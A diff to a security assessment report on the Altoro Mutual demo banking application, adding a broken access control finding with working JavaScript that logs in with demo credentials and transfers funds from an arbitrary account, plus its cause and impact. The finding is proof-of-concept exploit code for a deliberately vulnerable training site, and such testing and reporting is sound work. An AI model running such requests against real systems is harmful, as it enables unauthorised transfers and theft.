@@ -127,6 +127,37 @@ Report content:
   - Impact: users can transfer negative funds to each other
 
 - Broken access control
+  - Use the following javascript, and observe funds get sent from 800000 to 800004:
+    username = 'jdoe';
+    password = 'demo1234';
+    res = await (
+      await fetch('/altoromutual/api/login', {
+        headers: { 'Content-Type': 'application/json' },
+        method: 'POST',
+        body: JSON.stringify({
+          username,
+          password
+        })
+      })
+    ).json();
+
+    auth = res.Authorization;
+
+    res = await (
+      await fetch('/altoromutual/api/transfer', {
+        headers: { 'Content-Type': 'application/json', Authorization: auth },
+        method: 'POST',
+        body: JSON.stringify({
+          fromAccount: '800000',
+          toAccount: '800004',
+          transferAmount: '2000000'
+        })
+      })
+    ).json();
+  - Cause: OperationsUtil.doApiTransfer does not do business logic checks before calling DBUtil.transferFunds
+  - Impact: a user can transfer money from an arbitrary account to his own
+
+- Broken access control
   - User the following javascript, and observe how you can fetch account details of another user:
       username = 'jdoe';
       password = 'demo1234';
